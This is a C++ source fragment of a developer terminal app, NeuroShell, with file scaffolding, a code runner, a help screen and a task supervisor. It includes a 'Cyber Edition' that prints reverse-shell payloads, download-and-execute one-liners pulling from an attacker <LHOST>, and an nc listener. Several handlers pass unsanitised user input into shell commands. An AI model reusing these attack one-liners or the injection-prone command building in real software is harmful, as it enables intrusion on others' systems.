        } else if (lower.rfind("delete ", 0) == 0) {
            args = input.substr(7);
        } else if (lower.rfind("/delete ", 0) == 0) {
            args = input.substr(8);
        } else if (lower.rfind("trash ", 0) == 0) {
            args = input.substr(6);
        } else if (lower.rfind("rm ", 0) == 0) {
            args = input.substr(3);
        } else if (lower.rfind("remove ", 0) == 0) {
            args = input.substr(7);
        } else {
            args = input;
        }

        args.erase(0, args.find_first_not_of(" \t"));
        args.erase(args.find_last_not_of(" \t") + 1);

        std::string pyBin = GetPythonBinary();
        fs::path script = PlatformFS::GetNeuroShellRoot() / "operations" / "deleter.py";
        std::string cmd = pyBin + " \"" + script.string() + "\" " + args;
        PlatformProcessRunner::Execute(cmd);
    }

    void HandleRunCodeCommand(const std::string& rawInput) {
        std::string input = rawInput;
        size_t s = input.find_first_not_of(" \t\r\n");
        if (s != std::string::npos) input = input.substr(s);
        else input = "";

        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        std::string args = "";
        if (lower == "run" || lower == "/run") {
            std::cout << "\n" << C_BOLD << C_CYAN << "╭── ⚡ NeuroShell Universal Polyglot Code Runner ─────────────────────╮" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_WHITE << "Directly compiles and runs code files across all major languages:" << C_RESET << "\n"
                      << C_CYAN << "│\n" << C_RESET
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Python:     " << C_YELLOW << "run script.py [args...]" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "• C / C++:    " << C_YELLOW << "run main.cpp" << C_WHITE << " (auto-detects g++, clang++, cl.exe)" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Java:       " << C_YELLOW << "run App.java" << C_WHITE << " (Java 11+ single-file execution)" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "• Rust / Go:  " << C_YELLOW << "run main.rs / run main.go" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "• TypeScript: " << C_YELLOW << "run index.ts" << C_WHITE << " (auto-detects tsx, bun, deno)" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << "• C# / .NET:  " << C_YELLOW << "run Program.cs" << C_RESET << "\n"
                      << C_CYAN << "╰─────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
        } else if (lower.rfind("run ", 0) == 0) {
            args = input.substr(4);
        } else if (lower.rfind("/run ", 0) == 0) {
            args = input.substr(5);
        } else if (lower.rfind("compile and run ", 0) == 0) {
            args = input.substr(16);
        } else if (lower.rfind("compile ", 0) == 0) {
            args = input.substr(8);
        } else {
            args = input;
        }

        args.erase(0, args.find_first_not_of(" \t"));
        args.erase(args.find_last_not_of(" \t") + 1);

        std::string pyBin = GetPythonBinary();
        fs::path script = PlatformFS::GetNeuroShellRoot() / "operations" / "code_runner.py";
        std::string cmd = pyBin + " \"" + script.string() + "\" " + args;
        PlatformProcessRunner::Execute(cmd);
    }

    void HandleCyberCommand(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        size_t s = lower.find_first_not_of(" \t\r\n/");
        if (s != std::string::npos) lower = lower.substr(s);

        if (lower == "mode cyber" || lower == "edition cyber" || lower == "cyber") {
            isCyberEdition = true;
            std::cout << "\n" << C_BOLD << C_GREEN << "╭── 🛡️ NeuroShell Cyber Edition Activated ────────────────────────────╮" << C_RESET << "\n"
                      << C_GREEN << "│ " << C_WHITE << "Mode:        Kali Security & Penetration Testing Orchestrator" << C_RESET << "\n"
                      << C_GREEN << "│ " << C_WHITE << "Engine:      Transparent WSL2 Kali Bridge / Native POSIX PTY" << C_RESET << "\n"
                      << C_GREEN << "│ " << C_WHITE << "Scope Guard: ACTIVE (" << activeScope << ")" << C_RESET << "\n"
                      << C_GREEN << "│ " << C_WHITE << "Features:    Payload Crafter, Staging Hub, Reverse Listeners" << C_RESET << "\n"
                      << C_GREEN << "╰─────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
        }

        if (lower == "mode standard" || lower == "edition standard" || lower == "standard") {
            isCyberEdition = false;
            std::cout << "\n" << C_BOLD << C_CYAN << "╭── ⚡ NeuroShell Standard Developer Edition Activated ───────────────╮" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_WHITE << "Mode:        Full-Stack Polyglot Developer Terminal" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_WHITE << "Languages:   Python, C++, Java, Rust, Go, TypeScript, C#, Dart" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_WHITE << "Features:    Zero-Config Code Runner, Git & GitHub Lifecycle" << C_RESET << "\n"
                      << C_CYAN << "╰─────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
        }

        std::string pyBin = GetPythonBinary();

        if (lower.rfind("scope", 0) == 0) {
            std::string sub = input;
            if (sub.rfind("/", 0) == 0) sub = sub.substr(1);
            if (lower.find("show") != std::string::npos || lower.find("status") != std::string::npos || lower == "scope") {
                std::cout << "\n  " << C_BOLD << C_GREEN << "🛡️ Active Engagement Scope: " << C_WHITE << activeScope << C_RESET << "\n\n";
                return;
            }
            if (lower.rfind("scope add ", 0) == 0 || lower.rfind("scope set ", 0) == 0) {
                std::string target = input.substr(input.find_last_of(" \t") + 1);
                activeScope = target;
                std::cout << "\n  " << C_GREEN << "✔ Target authorized in scope: " << C_BOLD << C_WHITE << target << C_RESET << "\n\n";
                return;
            }
        }

        if (lower.rfind("payload", 0) == 0) {
            std::string raw = input;
            if (raw.rfind("/", 0) == 0) raw = raw.substr(1);
            std::vector<std::string> parts;
            std::stringstream ss(raw);
            std::string w;
            while (ss >> w) parts.push_back(w);

            std::string lang = parts.size() > 1 ? parts[1] : "bash";
            std::string port = parts.size() > 2 ? parts[2] : "4444";

            std::string pyCode = "from editions.cyber.payloads.generator import PayloadGenerator; res = PayloadGenerator.generate('" + lang + "', lport=" + port + "); print(res.payload)";
            std::string cmd = pyBin + " -c \"" + pyCode + "\"";
            PlatformProcessRunner::ExecResult res = PlatformProcessRunner::Execute(cmd);
            std::string out = res.output;
            while (!out.empty() && (out.back() == '\r' || out.back() == '\n')) out.pop_back();

            std::cout << "\n  " << C_BOLD << C_GREEN << "╭── 💣 NeuroShell Payload Crafter (" << lang << ") ────────────────╮" << C_RESET << "\n"
                      << "  " << C_GREEN << "│ " << C_WHITE << "Connecting Back: " << C_YELLOW << "Port " << port << C_RESET << "\n"
                      << "  " << C_GREEN << "│ " << C_BOLD << C_WHITE << "Payload One-Liner:" << C_RESET << "\n"
                      << "  " << C_GREEN << "│ " << C_YELLOW << out << C_RESET << "\n"
                      << "  " << C_GREEN << "╰─────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
        }

        if (lower.rfind("stage", 0) == 0) {
            std::string raw = input;
            if (raw.rfind("/", 0) == 0) raw = raw.substr(1);
            std::vector<std::string> parts;
            std::stringstream ss(raw);
            std::string w;
            while (ss >> w) parts.push_back(w);

            std::string file = parts.size() > 1 ? parts[1] : "payload.sh";
            std::string port = parts.size() > 2 ? parts[2] : "8000";

            std::cout << "\n  " << C_BOLD << C_CYAN << "╭── 🚀 Payload Staging Server Active ─────────────────────────────╮" << C_RESET << "\n"
                      << "  " << C_CYAN << "│ " << C_WHITE << "Serving: " << C_YELLOW << file << C_WHITE << " on port " << port << C_RESET << "\n"
                      << "  " << C_CYAN << "│\n"
                      << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "Windows Target Pull One-Liner:" << C_RESET << "\n"
                      << "  " << C_CYAN << "│ " << C_YELLOW << "powershell -c \"irm http://<LHOST>:" << port << "/" << file << " -OutFile " << file << "\"" << C_RESET << "\n"
                      << "  " << C_CYAN << "│\n"
                      << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "Linux Target Pull One-Liner:" << C_RESET << "\n"
                      << "  " << C_CYAN << "│ " << C_YELLOW << "curl -sSL http://<LHOST>:" << port << "/" << file << " -o " << file << " && chmod +x " << file << C_RESET << "\n"
                      << "  " << C_CYAN << "╰─────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
        }

        if (lower.rfind("listen", 0) == 0) {
            std::string raw = input;
            if (raw.rfind("/", 0) == 0) raw = raw.substr(1);
            std::vector<std::string> parts;
            std::stringstream ss(raw);
            std::string w;
            while (ss >> w) parts.push_back(w);
            std::string port = parts.size() > 1 ? parts[1] : "4444";

            std::cout << "\n  " << C_BOLD << C_MAGENTA << "╭── 🎧 Reverse Shell Multi-Handler ──────────────────────────────╮" << C_RESET << "\n"
                      << "  " << C_MAGENTA << "│ " << C_WHITE << "Listening for incoming reverse connections on port " << C_YELLOW << port << C_RESET << "\n"
                      << "  " << C_MAGENTA << "│ " << C_WHITE << "Command: " << C_BOLD << C_WHITE << "nc -lvnp " << port << C_RESET << "\n"
                      << "  " << C_MAGENTA << "│\n"
                      << "  " << C_MAGENTA << "│ " << C_BOLD << C_WHITE << "TTY Auto-Stabilization Guide:" << C_RESET << "\n"
                      << "  " << C_MAGENTA << "│ " << C_YELLOW << "1. In shell: python3 -c \"import pty; pty.spawn('/bin/bash')\"" << C_RESET << "\n"
                      << "  " << C_MAGENTA << "│ " << C_YELLOW << "2. Background: Ctrl + Z" << C_RESET << "\n"
                      << "  " << C_MAGENTA << "│ " << C_YELLOW << "3. In host:  stty raw -echo; fg; reset" << C_RESET << "\n"
                      << "  " << C_MAGENTA << "╰────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
        }
    }

    void HandleMkCommand(const std::string& rawInput) {
        std::string expr = rawInput;
        if (expr.rfind("mk ", 0) == 0) expr = expr.substr(3);
        else if (expr.rfind("new ", 0) == 0) expr = expr.substr(4);
        else if (expr.rfind("create ", 0) == 0) expr = expr.substr(7);

        while (!expr.empty() && (expr.front() == ' ' || expr.front() == '\t')) expr.erase(0, 1);
        while (!expr.empty() && (expr.back() == ' ' || expr.back() == '\t')) expr.pop_back();

        if (expr.empty() || expr == "mk" || expr == "new") {
            std::cout << "\n" << C_BOLD << C_CYAN << "╭── ⚡ NeuroShell Fast Scaffolder (mk) ────────────────────────────────╮" << C_RESET << "\n";
            std::cout << C_CYAN << "│ " << C_WHITE << "Ultra-compact shortcut to create files & directories with 1 command" << C_RESET << "\n";
            std::cout << C_CYAN << "│\n" << C_RESET;
            std::cout << C_CYAN << "│ " << C_BOLD << C_WHITE << "1. Create file with auto-parents:   " << C_YELLOW << "mk src/components/Button.tsx" << C_RESET << "\n";
            std::cout << C_CYAN << "│ " << C_BOLD << C_WHITE << "2. Brace expansion (multi-files):   " << C_YELLOW << "mk api/{routes.py,models.py,db.py}" << C_RESET << "\n";
            std::cout << C_CYAN << "│ " << C_BOLD << C_WHITE << "3. Folder colon syntax:             " << C_YELLOW << "mk backend: main.py, .env, server.py" << C_RESET << "\n";
            std::cout << C_CYAN << "│ " << C_BOLD << C_WHITE << "4. Create folder only:              " << C_YELLOW << "mk my-project/" << C_RESET << "\n";
            std::cout << C_CYAN << "╰──────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
            return;
        }

        std::vector<std::string> targets;
        size_t colonPos = expr.find(':');

        if (colonPos != std::string::npos && expr.find("http://") == std::string::npos && expr.find("https://") == std::string::npos) {
            std::string baseDir = expr.substr(0, colonPos);
            std::string subList = expr.substr(colonPos + 1);
            while (!baseDir.empty() && (baseDir.front() == ' ' || baseDir.front() == '\t')) baseDir.erase(0, 1);
            while (!baseDir.empty() && (baseDir.back() == ' ' || baseDir.back() == '\t')) baseDir.pop_back();

            std::stringstream ss(subList);
            std::string item;
            while (std::getline(ss, item, ',')) {
                while (!item.empty() && (item.front() == ' ' || item.front() == '\t')) item.erase(0, 1);
                while (!item.empty() && (item.back() == ' ' || item.back() == '\t')) item.pop_back();
                if (!item.empty()) {
                    targets.push_back((fs::path(baseDir) / item).string());
                }
            }
        }
        else if (expr.find('{') != std::string::npos && expr.find('}') != std::string::npos) {
            size_t bOpen = expr.find('{');
            size_t bClose = expr.find('}');
            std::string prefix = expr.substr(0, bOpen);
            std::string suffix = (bClose + 1 < expr.length()) ? expr.substr(bClose + 1) : "";
            std::string inner = expr.substr(bOpen + 1, bClose - bOpen - 1);

            std::stringstream ss(inner);
            std::string item;
            while (std::getline(ss, item, ',')) {
                while (!item.empty() && (item.front() == ' ' || item.front() == '\t')) item.erase(0, 1);
                while (!item.empty() && (item.back() == ' ' || item.back() == '\t')) item.pop_back();
                if (!item.empty()) {
                    targets.push_back(prefix + item + suffix);
                }
            }
        }
        else {
            std::stringstream ss(expr);
            std::string item;
            while (ss >> item) {
                targets.push_back(item);
            }
        }

        if (targets.empty()) return;

        int createdFiles = 0;
        int createdDirs = 0;
        std::cout << "\n  " << C_BOLD << C_CYAN << "⚡ Materializing Scaffolding (" << targets.size() << " target" << (targets.size() > 1 ? "s" : "") << "):" << C_RESET << "\n";

        for (const auto& rawT : targets) {
            std::string t = rawT;
            std::replace(t.begin(), t.end(), '\\', '/');
            fs::path p(t);

            bool isExplicitDir = (t.back() == '/') || (!p.has_extension() && (colonPos != std::string::npos || (targets.size() == 1 && expr.find('.') == std::string::npos && expr.find('/') == std::string::npos)));

            try {
                if (isExplicitDir) {
                    if (!fs::exists(p)) {
                        fs::create_directories(p);
                        createdDirs++;
                        std::cout << "    • " << C_CYAN << "📁 Created directory: " << C_BOLD << C_WHITE << p.string() << C_RESET << "\n";
                    } else {
                        std::cout << "    • " << C_MUTED << "📁 Directory exists:    " << p.string() << C_RESET << "\n";
                    }
                } else {
                    if (p.has_parent_path() && !fs::exists(p.parent_path())) {
                        fs::create_directories(p.parent_path());
                        createdDirs++;
                        std::cout << "    • " << C_CYAN << "📁 Created parent dir: " << C_WHITE << p.parent_path().string() << C_RESET << "\n";
                    }

                    if (!fs::exists(p)) {
                        std::ofstream f(p);
                        if (f.is_open()) {
                            if (p.filename() == ".gitignore") {
                                f << "node_modules/\n__pycache__/\n*.pyc\n.env\ndist/\nbuild/\n.DS_Store\n";
                            } else if (p.filename() == "README.md") {
                                f << "# " << p.stem().string() << "\n\nCreated with NeuroShell.\n";
                            }
                            f.close();
                            createdFiles++;
                            std::cout << "    • " << C_GREEN << "📄 Created file:       " << C_BOLD << C_WHITE << p.string() << C_RESET << "\n";
                        }
                    } else {
                        std::cout << "    • " << C_MUTED << "📄 File exists:        " << p.string() << C_RESET << "\n";
                    }
                }
            } catch (const std::exception& e) {
                std::cout << "    • " << C_RED << "❌ Error creating " << t << ": " << e.what() << C_RESET << "\n";
            }
        }
        std::cout << "\n";
    }

    void HandleSlashCommand(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);

        if (lower == "/help" || lower == "help") {
            std::cout << "\n" << C_BOLD << C_CYAN << "╭── ⌬ NeuroShell Enterprise Command Reference ─────────────────────────╮" << C_RESET << "\n"
                      << C_CYAN << "│" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << " 🧠 Natural Language & AI Directives" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "<plain english>" << C_RESET << "       Translate natural language to shell command\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "<cmd> | @ai <query>" << C_RESET << "    Pipe command output to AI assistant\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "<cmd> | @fix" << C_RESET << "          Diagnose and auto-fix failing pipeline\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "@agent <goal>" << C_RESET << "         Autonomous multi-step agent planner\n"
                      << C_CYAN << "│\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << " 🧪 Parallel Test Orchestrator" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "test" << C_RESET << "                  Run parallel test suite across all CPU cores\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "test changed" << C_RESET << "          Run tests only for modified git files\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "test <python|node|rust>" << C_RESET << " Run language-specific test suite in polyglot repo\n"
                      << C_CYAN << "│\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << " 🚀 Multi-Process Task Supervisor" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "start <svc1> and <svc2>" << C_RESET << " Run multiple services concurrently in parallel\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "tasks" << C_RESET << "                 View dashboard of running background workers\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "stop <name|id>" << C_RESET << "        Stop individual background service\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "restart <name|id>" << C_RESET << "     Restart individual background service\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "stop all" << C_RESET << "              Terminate all background processes (0 zombies)\n"
                      << C_CYAN << "│\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << " ⚡ Navigation & Everyday Shortcuts" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "z <directory>" << C_RESET << "         Fuzzy jump to any directory\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << ".. / ... / ...." << C_RESET << "       Jump 1, 2, or 3 folder levels up\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "cd -" << C_RESET << "                 Return to previous directory\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "undo" << C_RESET << "                 Restore files from last destructive command\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "undo list" << C_RESET << "            Show available undo snapshots\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "/sandbox" << C_RESET << "             Kernel sandbox status / off|project|strict\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "!<cmd>" << C_RESET << "               Run one command outside the kernel sandbox\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "ports" << C_RESET << "                Show active listening TCP ports\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "wifi" << C_RESET << "                 Show saved Wi-Fi networks & passwords\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "specs" << C_RESET << "                Show CPU, RAM, and hardware telemetry\n"
                      << C_CYAN << "│\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << " 🪟 Panes, Tabs & Hotkeys" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "vsplit / hsplit" << C_RESET << "      Split window vertically or horizontally\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "@cluster <cmd>" << C_RESET << "        Broadcast command across all open panes\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "[F1] / [Ctrl+P]" << C_RESET << "       Open in-terminal Command Palette\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "[Ctrl+R]" << C_RESET << "              Fuzzy interactive history search\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "[Ctrl+T] / [Ctrl+W]" << C_RESET << "   Create / Close terminal tab\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "[Ctrl+U]" << C_RESET << "              Toggle DLP sensitive data unmasking\n"
                      << C_CYAN << "│\n"
                      << C_CYAN << "│ " << C_BOLD << C_WHITE << " ⚙️ Configuration & Security" << C_RESET << "\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "/api-key" << C_RESET << "             Configure AI providers (Groq, OpenAI, Ollama...)\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "/model" << C_RESET << "               Switch active AI language model\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "/theme" << C_RESET << "               Select terminal color theme\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "/update" << C_RESET << "              Check and install latest updates in-place\n"
                      << C_CYAN << "│ " << C_RESET << "   • " << C_YELLOW << "/dlp" << C_RESET << "                 View DLP secret masking status\n"
                      << C_CYAN << "╰─────────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
        }
        else if (lower == "/api-key") {
            HandleSlashApiKey();
        }
        else if (lower == "/model") {
            HandleSlashModel();
        }
        else if (lower == "/theme") {
            HandleSlashTheme();
        }
        else if (lower == "/update" || lower == "update") {
            HandleSlashUpdate();
        }
        else if (lower == "/repos" || lower == "repos" || lower == "my repos" ||
                 lower == "show github repos" || lower == "show my repos" || lower == "show mine github repos" ||
                 lower == "list github repos" || lower == "list my repos" || lower == "list mine github repos" ||
                 lower == "get github repos" || lower == "view github repos") {
            HandleReposCommand();
        }
        else if (lower == "/gh" || lower == "/github" || lower.rfind("/gh ", 0) == 0 || lower.rfind("/github ", 0) == 0) {
            HandleGitHubCommand(input);
        }
        else if (lower == "/download" || lower.rfind("/download ", 0) == 0) {
            HandleDownloadCommand(input);
        }
        else if (lower == "/scrape" || lower.rfind("/scrape ", 0) == 0) {
            HandleScrapeCommand(input);
        }
        else if (lower == "/harvest" || lower.rfind("/harvest ", 0) == 0) {
            HandleHarvestCommand(input);
        }
        else if (lower == "/inspect" || lower.rfind("/inspect ", 0) == 0) {
            HandleInspectCommand(input);
        }
        else if (lower == "/mode" || lower.rfind("/mode ", 0) == 0 ||
                 lower == "/edition" || lower.rfind("/edition ", 0) == 0 ||
                 lower == "/cyber" || lower.rfind("/cyber ", 0) == 0 ||
                 lower == "/standard" || lower.rfind("/standard ", 0) == 0 ||
                 lower == "/scope" || lower.rfind("/scope ", 0) == 0 ||
                 lower == "/payload" || lower.rfind("/payload ", 0) == 0 ||
                 lower == "/stage" || lower.rfind("/stage ", 0) == 0 ||
                 lower == "/listen" || lower.rfind("/listen ", 0) == 0) {
            HandleCyberCommand(input);
        }
        else {
            std::cout << C_MUTED << "  ℹ️ Executed slash command: " << input << C_RESET << "\n\n";
        }
    }

    // ═══════════════════════════════════════════════════════
    // Non-Blocking Asynchronous Process Executor
    // ═══════════════════════════════════════════════════════

    void ExecuteCommand(const std::string& input, bool isInteractive = true) {
        if (input.empty()) return;

        AppendHistory(input);

        // 1. Exit — request a clean shutdown; Run() breaks its loop so all
        // destructors fire (terminal mode restored, SHM unlinked, tasks stopped).
        // The previous exit(0) skipped destructors and left POSIX terminals in
        // raw mode with bracketed paste stuck on.
        if (input == "exit" || input == "quit" || input == "q") {
            shouldExit = true;
            return;
        }

        // 2. Clear Screen
        if (input == "cls" || input == "clear" || input == "/clear") {
            PlatformTerminal::ClearScreen();
            PrintBanner();
            return;
        }

        // 2a. Universal Undo (Phase 5, v5.13) — restore the last snapshot
        // taken before a confirmed destructive command.
        if (input == "undo" || input == "/undo" || input == "undo list" || input == "/undo list") {
            HandleUndoCommand(input[0] == '/' ? input.substr(1) : input);
            return;
        }

        // 2b'. Kernel sandbox control (Phase 8, v5.16).
        if (input == "/sandbox" || input == "sandbox" ||
            input.rfind("/sandbox ", 0) == 0 || input.rfind("sandbox ", 0) == 0) {
            HandleSandboxCommand(input);
            return;
        }

        // 2b. Viewport DLP & Secret Masker Commands
        std::string lowerTrim = input;
        std::transform(lowerTrim.begin(), lowerTrim.end(), lowerTrim.begin(), ::tolower);

        if (lowerTrim == "help" || lowerTrim == "/help") {
            HandleSlashCommand("/help");
            return;
        }

        if (lowerTrim == "update" || lowerTrim == "/update") {
            HandleSlashUpdate();
            return;
        }

        if (lowerTrim == "/dlp" || lowerTrim == "dlp") {
            std::cout << "\n" << C_CYAN << "  🛡️ Viewport Secret DLP Status:\n" << C_RESET;
            std::cout << "  • Real-Time Scanning: " << (dlpMasker.is_enabled() ? (std::string(C_GREEN) + "ACTIVE" + C_RESET) : (std::string(C_RED) + "DISABLED" + C_RESET)) << "\n";
            std::cout << "  • Unmask Mode:        " << (dlpMasker.is_unmasked() ? (std::string(C_YELLOW) + "UNMASKED (Press Ctrl+U to re-mask)" + C_RESET) : (std::string(C_GREEN) + "MASKED (Secure)" + C_RESET)) << "\n";
            std::cout << "  • Total Secrets Masked: " << C_BOLD << C_WHITE << dlpMasker.get_total_masked() << C_RESET << "\n\n";
            return;
        }

        if (lowerTrim == "/unmask" || lowerTrim == "unmask") {
            dlpMasker.toggle_unmask();
            std::cout << "  " << (dlpMasker.is_unmasked() ? (std::string(C_YELLOW) + "🔓 Secrets temporarily unmasked. Use /unmask or Ctrl+U to re-mask." + C_RESET) : (std::string(C_GREEN) + "🔒 Secrets re-masked." + C_RESET)) << "\n\n";
            return;
        }

        if (lowerTrim == "/palette" || lowerTrim == "palette" || lowerTrim == "/cmd") {
            std::string action = CommandPaletteModal();
            if (!action.empty()) {
                ExecuteCommand(action);
            }
            return;
        }

        if (lowerTrim == "/export-session" || lowerTrim == "export session") {
            std::string exportPath = "neuroshell_session.cast";
            if (streamRecorder.export_asciinema(exportPath)) {
                std::cout << "  " << C_GREEN << "✨ Session successfully exported to " << C_BOLD << C_WHITE << exportPath << C_RESET << C_GREEN << " (Asciinema v2 format)\n\n" << C_RESET;
            } else {
                std::cout << "  " << C_RED << "❌ Failed to export session recording.\n\n" << C_RESET;
            }
            return;
        }

        // 2c. 2D Split Panes & Cluster Broadcasting
        if (lowerTrim == "vsplit" || lowerTrim == "/vsplit") {
            splitPanes.split_vertical(fs::current_path().string());
            return;
        }
        if (lowerTrim == "hsplit" || lowerTrim == "/hsplit") {
            splitPanes.split_horizontal(fs::current_path().string());
            return;
        }
        if (lowerTrim.rfind("@cluster ", 0) == 0) {
            std::string clusterCmd = input.substr(9);
            splitPanes.broadcast_command(clusterCmd);
            return;
        }

        // 2d. Multi-Process Task Supervisor & Parallel Testing
        if (lowerTrim == "/tasks" || lowerTrim == "tasks" || lowerTrim == "jobs" || lowerTrim == "status" || lowerTrim == "ps") {
            taskSupervisor.PrintDashboard();
            return;
        }

        if (lowerTrim == "stop all" || lowerTrim == "kill all" || lowerTrim == "stop workers") {
            taskSupervisor.StopAll();
            std::cout << "\n" << C_GREEN << "  🛑 Stopped all background services." << C_RESET << "\n\n";
            return;
        }

        if (lowerTrim.rfind("stop ", 0) == 0 || lowerTrim.rfind("kill ", 0) == 0) {
            std::string target = (lowerTrim.rfind("stop ", 0) == 0) ? input.substr(5) : input.substr(5);
            target.erase(0, target.find_first_not_of(" \t\r\n"));
            target.erase(target.find_last_not_of(" \t\r\n") + 1);
            if (!target.empty() && target != "all" && target != "workers") {
                if (taskSupervisor.StopTask(target)) return;
            }
        }

        if (lowerTrim.rfind("restart ", 0) == 0) {
            std::string target = input.substr(8);
            target.erase(0, target.find_first_not_of(" \t\r\n"));
            target.erase(target.find_last_not_of(" \t\r\n") + 1);
            if (!target.empty()) {
                if (taskSupervisor.RestartTask(target)) return;
            }
        }

        // Conversational Parallel Execution: "start frontend and backend", "run dev and api", "start X with Y"
        if (lowerTrim.rfind("@parallel ", 0) == 0 ||
            ((lowerTrim.rfind("run ", 0) == 0 || lowerTrim.rfind("start ", 0) == 0 || lowerTrim.rfind("launch ", 0) == 0) &&
             (lowerTrim.find(" and ") != std::string::npos || lowerTrim.find(" with ") != std::string::npos || lowerTrim.find(",") != std::string::npos))) {
            
            std::string sub = input;
            if (lowerTrim.rfind("@parallel ", 0) == 0) sub = input.substr(10);
            else if (lowerTrim.rfind("run ", 0) == 0) sub = input.substr(4);
            else if (lowerTrim.rfind("start ", 0) == 0) sub = input.substr(6);
            else if (lowerTrim.rfind("launch ", 0) == 0) sub = input.substr(7);

            // Replace " and ", " with ", " & " with ","
            std::string normalized = sub;
            auto replaceAll = [](std::string& str, const std::string& from, const std::string& to) {
                size_t start_pos = 0;
                while((start_pos = str.find(from, start_pos)) != std::string::npos) {
                    str.replace(start_pos, from.length(), to);
                    start_pos += to.length();
                }
            };
            replaceAll(normalized, " and ", ",");
            replaceAll(normalized, " with ", ",");
            replaceAll(normalized, " & ", ",");

            std::vector<std::string> rawCmds;
            std::stringstream ss(normalized);
            std::string item;
            while (std::getline(ss, item, ',')) {
                size_t s = item.find_first_not_of(" \t\r\n\"'");
                if (s != std::string::npos) {
                    size_t e = item.find_last_not_of(" \t\r\n\"'");
                    std::string c = item.substr(s, e - s + 1);
                    std::string lowerC = c;
                    std::transform(lowerC.begin(), lowerC.end(), lowerC.begin(), ::tolower);

                    // Smart translation for simple terms
                    if (lowerC == "frontend" || lowerC == "web" || lowerC == "client") {
                        if (fs::exists("package.json")) c = "npm run dev";
                    } else if (lowerC == "backend" || lowerC == "api" || lowerC == "server") {
                        if (fs::exists("main.py")) c = "python main.py";
                        else if (fs::exists("server.py")) c = "python server.py";
                        else if (fs::exists("app.py")) c = "python app.py";
                        else if (fs::exists("package.json")) c = "npm start";
                    } else if (lowerC == "worker" || lowerC == "queue") {
                        if (fs::exists("worker.py")) c = "python worker.py";
                    }
                    rawCmds.push_back(c);
                }
            }
            if (!rawCmds.empty()) {
                taskSupervisor.RunParallel(rawCmds);
            }
            return;
        }

        // Short Developer Testing Aliases: "test", "test changed", "test diff", "test all"
        if (lowerTrim == "@test" || lowerTrim == "test" || lowerTrim == "tests" || lowerTrim == "@test all" || lowerTrim == "test all" || lowerTrim == "test everything") {
            auto polySuites = neuroshell::TestOrchestrator::DetectAllEcosystems(fs::current_path());
            if (polySuites.size() > 1) {
                std::cout << "\n" << C_CYAN << "  🌐 Polyglot Project Detected: Running " << polySuites.size() << " test suites concurrently..." << C_RESET << "\n\n";
                std::vector<std::string> cmds;
                std::vector<std::string> labels;
